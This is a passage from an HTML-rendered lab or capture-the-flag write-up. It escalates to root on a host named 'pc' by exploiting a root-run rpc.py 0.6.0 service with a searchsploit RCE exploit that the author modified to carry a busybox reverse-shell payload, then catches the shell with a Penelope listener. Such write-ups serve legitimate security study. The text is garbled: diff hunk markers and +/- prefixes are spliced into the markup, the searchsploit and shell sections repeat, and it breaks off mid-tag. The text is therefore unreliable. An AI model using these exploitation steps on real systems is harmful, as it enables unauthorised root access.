ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">user@pc:/dev/shm<span class="cm-def">$ ss</span> <span class="cm-attribute">-tulnp</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Netid &nbsp; &nbsp; State &nbsp; &nbsp;  Recv-Q &nbsp; &nbsp; Send-Q &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Local Address:Port &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  Peer Address:Port &nbsp; &nbsp; Process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">udp &nbsp; &nbsp; &nbsp; UNCONN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">127</span>.0.0.53%lo:53 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">4096</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">127</span>.0.0.53%lo:53 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">2048</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">127</span>.0.0.1:65432 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span>.0.0.0:8000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">0</span>.0.0.0:* &nbsp; &nbsp; &nbsp; &nbsp; users:((<span class="cm-string">"ttyd"</span><span class="cm-def">,pid</span><span class="cm-operator">=</span><span class="cm-number">1009</span><span class="cm-def">,fd</span><span class="cm-operator">=</span><span class="cm-number">12</span>)) &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp &nbsp; &nbsp; &nbsp; LISTEN &nbsp; &nbsp; <span class="cm-number">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">128</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [::]:22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  [::]:* </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 176px;"></div><div class="CodeMirror-gutters" style="display: none; height: 176px;"></div></div></div></pre><p><span>Then I ran pspy. A specific process stood out in the pspy output: a Python script </span><code>/opt/rpc.py</code><span> being executed with root privileges.</span></p><p><img src="./pc.assets/image-20260128203848323.png" alt="image-20260128203848323"></p><p><span>I read the code inside the file </span><code>/opt/rpc.py</code><span> and the last line of the file is connecting to port 65432.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">user@pc:/dev/shm<span class="cm-def">$ cat</span> /opt/rpc.py </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from typing import AsyncGenerator</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from typing_extensions import TypedDict</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">import uvicorn</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from rpcpy import RPC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">app <span class="cm-operator">=</span> RPC<span class="cm-def">(mode</span><span class="cm-operator">=</span><span class="cm-string">"ASGI"</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@app.register</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">async def none() <span class="cm-attribute">-</span>&gt; None:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  return</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
@@ -939,6 +946,6 @@ pre.md-fences,
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@app.register</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">async def yield_data(max_num: int) <span class="cm-attribute">-</span>&gt; AsyncGenerator[int, None]:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">for</span> i <span class="cm-keyword">in</span> range(max_num):</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  yield i</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">D <span class="cm-operator">=</span> TypedDict(<span class="cm-string">"D"</span>, {<span class="cm-string">"key"</span>: str, <span class="cm-string">"other-key"</span>: str})</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@app.register</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">async def query_dict(value: str) <span class="cm-attribute">-</span>&gt; D:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  return {<span class="cm-string">"key"</span>: value, <span class="cm-string">"other-key"</span>: value}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> __name__ <span class="cm-operator">==</span> <span class="cm-string">"__main__"</span>:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  uvicorn.run(app, <span class="cm-def">interface</span><span class="cm-operator">=</span><span class="cm-string">"asgi3"</span>, <span class="cm-def">port</span><span class="cm-operator">=</span><span class="cm-number">65432</span>)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 741px;"></div><div class="CodeMirror-gutters" style="display: none; height: 741px;"></div></div></div></pre><p><span>A search for </span><code>rpc.py</code><span> in Searchsploit yielded a promising RCE exploit.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ searchsploit</span> rpc.py &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Exploit Title &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |  Path</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rpc.py <span class="cm-number">0</span>.6.0 <span class="cm-attribute">-</span> Remote Code Execution (RCE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | python/remote/50983.py</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Shellcodes: No Results</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 346px;"></div><div class="CodeMirror-gutters" style="display: none; height: 346px;"></div></div></div></pre><p><span>I downloaded the exploit and modified the main function to include a busybox reverse shell payload targeting my Kali listener on port 65432.</span></p><p><img src="./pc.assets/image-20260128203901367.png" alt="image-20260128203901367"></p><p><span>After executing the modified exploit, I successfully caught a root-level reverse shell using Penelope.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ python3</span> penelope.py <span class="cm-attribute">-p</span> <span class="cm-number">65432</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Listening <span class="cm-keyword">for</span> reverse shells on <span class="cm-number">0</span>.0.0.0:65432 → &nbsp;<span class="cm-number">127</span>.0.0.1 • <span class="cm-number">192</span>.168.136.128 • <span class="cm-number">172</span>.17.0.1 • <span class="cm-number">172</span>.20.0.1 • <span class="cm-number">192</span>.168.45.236</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[-] Invalid shell from <span class="cm-number">192</span>.168.108.210 🙄</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Got reverse shell from pc~192.168.108.210-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Attempting to upgrade shell to PTY...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Shell upgraded successfully using /usr/bin/python3! 💪</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Interacting with session [1], Shell Type: PTY, Menu key: F12 </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Logging to /home/kali/.penelope/sessions/pc~192.168.108.210-Linux-x86_64/2026_01_13-03_11_58-503.log 📜</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/<span class="cm-comment"># whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/<span class="cm-comment"># </span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 420px;"></div><div class="CodeMirror-gutters" style="display: none; height: 420px;"></div></div></div></pre><p><span>Found </span><code>root.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/root<span class="cm-comment"># ls</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">email4.txt  proof.txt  snap</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@pc:/root<span class="cm-comment"># cat proof.txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">5239</span>...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 99px;"></div><div class="CodeMirror-gutters" style="display: none; height: 99px;"></div></div></div></pre></div></div>
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> __name__ <span class="cm-operator">==</span> <span class="cm-string">"__main__"</span>:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  uvicorn.run(app, <span class="cm-def">interface</span><span class="cm-operator">=</span><span class="cm-string">"asgi3"</span>, <span class="cm-def">port</span><span class="cm-operator">=</span><span class="cm-number">65432</span>)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 658px;"></div><div class="CodeMirror-gutters" style="display: none; height: 658px;"></div></div></div></pre><p><span>A search for </span><code>rpc.py</code><span> in Searchsploit yielded a promising RCE exploit.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ searchsploit</span> rpc.py &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Exploit Title &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |  Path</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rpc.py <span class="cm-number">0</span>.6.0 <span class="cm-attribute">-</span> Remote Code Execution (RCE) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | python/remote/50983.py</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">--------------------------------------------------------------------------------------------------------</span> <span class="cm-attribute">---------------------------------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Shellcodes: No Results</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 176px;"></div><div class="CodeMirror-gutters" style="display: none; height: 176px;"></div></div></div></pre><p><span>I downloaded the exploit and modified the main function to include a busybox reverse shell payload targeting my Kali listener on port 65432.</span></p><p><img src="./pc.assets/image-20260128203901367.png" alt="image-20260128203901367"></p><p><span>After executing the modified exploit, I successfully caught a root-level reverse shell using Penelope.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 